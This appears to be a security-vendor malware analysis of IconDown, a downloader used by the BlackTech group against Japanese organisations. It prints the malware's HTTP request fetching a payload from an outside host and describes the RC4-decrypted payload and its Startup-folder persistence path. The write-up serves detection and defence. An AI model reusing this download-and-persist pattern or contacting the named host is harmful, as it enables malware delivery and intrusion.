IconDown – Downloader Used by BlackTech
BlackTech

Email
In the past articles, we have introduced TSCookie and PLEAD, the malware used by an
attack group BlackTech. We have confirmed that this group also uses another type of
malware called “IconDown”. According to ESET’s blog[1], it has been confirmed that the
malware is distributed through the update function of ASUS WebStorage. This article
describes the details of IconDown found in Japanese organisations.

IconDown’s behaviour
The malware downloads a file from a specific site. This is an example of the HTTP GET
requests sent from IconDown.
GET /logo.png HTTP/1.1
Host: update.panasocin.com
Cache-Control: no-cache

Then, it searches for the following HEX values (as a signature of the embedded data) from
the beginning of the downloaded file.
91 00 13 87 33 00 90 06 19

If the signature value is found, the following 256-byte data is parsed as a RC4 key. It is used
to decrypt the data embedded in the downloaded file. (See Table 1 in Appendix A for details.)

Figure 1: RC4 key and encrypted data
RC4-encrypted data is expected to contain configuration value and PE file. The following
figure show the decrypted data.

Figure 2: Example of decrypted data
IconDown creates a PE file from the decrypted data and save it to the filesystem. Based on
the configuration value, it determines the path to save the file from the following:
File name contained in the configuration of the downloaded file
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\slui.exe
%TEMP%\F{random 8-digit hexadecimal string}.TMP
Then, the saved PE file is executed as specified in the configuration value. (See Table 3 in
Appendix B for details of the configuration.)

In Closing
BlackTech has carried our attacks against Japanese organisations by using various types of
malware. As the same activity is likely to continue, we will keep an eye on the situation. The
hash values of the sample are listed in Appendix C, as well as a C&C server in Appendix D.
Please make sure that none of your devices is communicating to the host.
